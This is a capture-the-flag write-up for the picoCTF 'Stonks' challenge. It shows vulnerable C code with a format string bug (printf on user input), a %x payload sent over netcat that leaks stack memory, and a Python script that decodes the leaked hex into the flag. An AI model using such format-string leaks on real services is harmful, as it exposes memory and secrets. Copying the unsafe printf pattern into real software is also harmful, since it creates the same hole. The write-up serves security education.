### Stonks ðŸ’°

Taking a look at the `vuln.c`:

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <time.h>

#define FLAG_BUFFER 128
#define MAX_SYM_LEN 4

typedef struct Stonks {
	int shares;
	char symbol[MAX_SYM_LEN + 1];
	struct Stonks *next;
} Stonk;

typedef struct Portfolios {
	int money;
	Stonk *head;
} Portfolio;

int view_portfolio(Portfolio *p) {
	if (!p) {
		return 1;
	}
	printf("\nPortfolio as of ");
	fflush(stdout);
	system("date"); // TODO: implement this in C
	fflush(stdout);

	printf("\n\n");
	Stonk *head = p->head;
	if (!head) {
		printf("You don't own any stonks!\n");
	}
	while (head) {
		printf("%d shares of %s\n", head->shares, head->symbol);
		head = head->next;
	}
	return 0;
}

Stonk *pick_symbol_with_AI(int shares) {
	if (shares < 1) {
		return NULL;
	}
	Stonk *stonk = malloc(sizeof(Stonk));
	stonk->shares = shares;

	int AI_symbol_len = (rand() % MAX_SYM_LEN) + 1;
	for (int i = 0; i <= MAX_SYM_LEN; i++) {
		if (i < AI_symbol_len) {
			stonk->symbol[i] = 'A' + (rand() % 26);
		} else {
			stonk->symbol[i] = '\0';
		}
	}

	stonk->next = NULL;

	return stonk;
}

int buy_stonks(Portfolio *p) {
	if (!p) {
		return 1;
	}
	char api_buf[FLAG_BUFFER];
	FILE *f = fopen("api","r");
	if (!f) {
		printf("Flag file not found. Contact an admin.\n");
		exit(1);
	}
	fgets(api_buf, FLAG_BUFFER, f);

	int money = p->money;
	int shares = 0;
	Stonk *temp = NULL;
	printf("Using patented AI algorithms to buy stonks\n");
	while (money > 0) {
		shares = (rand() % money) + 1;
		temp = pick_symbol_with_AI(shares);
		temp->next = p->head;
		p->head = temp;
		money -= shares;
	}
	printf("Stonks chosen\n");

	// TODO: Figure out how to read token from file, for now just ask

	char *user_buf = malloc(300 + 1);
	printf("What is your API token?\n");
	scanf("%300s", user_buf);
	printf("Buying stonks with token:\n");
	printf(user_buf);

	// TODO: Actually use key to interact with API

	view_portfolio(p);

	return 0;
}

Portfolio *initialize_portfolio() {
	Portfolio *p = malloc(sizeof(Portfolio));
	p->money = (rand() % 2018) + 1;
	p->head = NULL;
	return p;
}

void free_portfolio(Portfolio *p) {
	Stonk *current = p->head;
	Stonk *next = NULL;
	while (current) {
		next = current->next;
		free(current);
		current = next;
	}
	free(p);
}

int main(int argc, char *argv[])
{
	setbuf(stdout, NULL);
	srand(time(NULL));
	Portfolio *p = initialize_portfolio();
	if (!p) {
		printf("Memory failure\n");
		exit(1);
	}

	int resp = 0;

	printf("Welcome back to the trading app!\n\n");
	printf("What would you like to do?\n");
	printf("1) Buy some stonks!\n");
	printf("2) View my portfolio\n");
	scanf("%d", &resp);

	if (resp == 1) {
		buy_stonks(p);
	} else if (resp == 2) {
		view_portfolio(p);
	}

	free_portfolio(p);
	printf("Goodbye!\n");

	exit(0);
}
```

The bug is obvious here:

```c
char *user_buf = malloc(300 + 1);
printf("What is your API token?\n");
scanf("%300s", user_buf);
printf("Buying stonks with token:\n");
printf(user_buf);
```

There is a `Format string bug` there. Let's see what we can leak from there:

```bash
âžœ  stonks git:(main) âœ— nc mercury.picoctf.net 33411
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x
Buying stonks with token:
9dd1350,804b000,80489c3,f7ed4d80,ffffffff,1,9dcf160,f7ee2110,f7ed4dc7,0,9dd0180,2,9dd1330,9dd1350,6f636970,7b465443,306c5f49,345f7435,6d5f6c6c,306d5f79,5f79336e,63343261,36613431,fff2007d,f7f0faf8,f7ee2440,ffaf8000,1,0,f7d71ce9,f7ee30c0,f7ed45c0,f7ed4000,fff28c08,f7d6268d,f7ed45c0,8048eca,fff28c14,0,f7ef6f09,804b000,f7ed4000,f7ed4e20,fff28c48,f7efcd50,f7ed5890,ffaf8000,f7ed4000,804b000,fff28c48,8048c86,9dcf160,fff28c34,fff28c48,8048be9,f7ed43fc,0,fff28cfc,fff28cf4,1,1,9dcf160,ffaf8000,fff28c60,0,0,f7d17fa1,f7ed4000,f7ed4000,0,f7d17fa1,1,fff28cf4,fff28cfc,fff28c84,1,0,f7ed4000,f7ef770a,f7f0f000,0,f7ed4000,0,0,a064b9f8,e782bfe8,0,0,0,1,8048630,0,f7efcd50,f7ef7960,804b000,1,8048630,0,8048662,8048b85
```

We see that it's a `32-bit` binary from the addresses starting with `0x80*`. Now, we know that the flag format is `picoCTF{}`.

Converting these characters to hex:

```python
'0x70'
>>> hex(ord('i'))
'0x69'
```

So, we need to find the bytes `0x70` and `0x69` (noice!), next to each other.  If we search for these 2 numbers we see them in this address:

```
6f636970
```

We see that the flag is opened on the stack before the print, so it was obvious we could leak it this way. Now we need to convert these hex values to ASCII to get the flag. The flag always ends with `}` which has the hex value `0x7d`, so we know where to stop and take only the necessary addresses.

```python
addr = ['6f636970', '7b465443', '306c5f49', '345f7435', '6d5f6c6c', '306d5f79',
        '5f79336e', '63343261', '36613431', 'fff2007d']
```

```python
#!/usr/bin/python3.8
from pwn import *
import warnings
warnings.filterwarnings('ignore')
context.arch = 'amd64'

addr = ['6f636970', '7b465443', '306c5f49', '345f7435', '6d5f6c6c', '306d5f79',
        '5f79336e', '63343261', '36613431', 'fff2007d']

flag = ''

for i in addr:
  tmp = ''
  for j in range(0, 8, 2):
    tmp += chr(int(i[j + 0: j + 2], 16))
  flag += tmp[::-1]

flag = flag.split('}')[0]
print(f'Flag --> {flag}}}')
```

```bash
âžœ  stonks git:(main) âœ— python solver.py
Flag --> picoCTF{XXX}
```
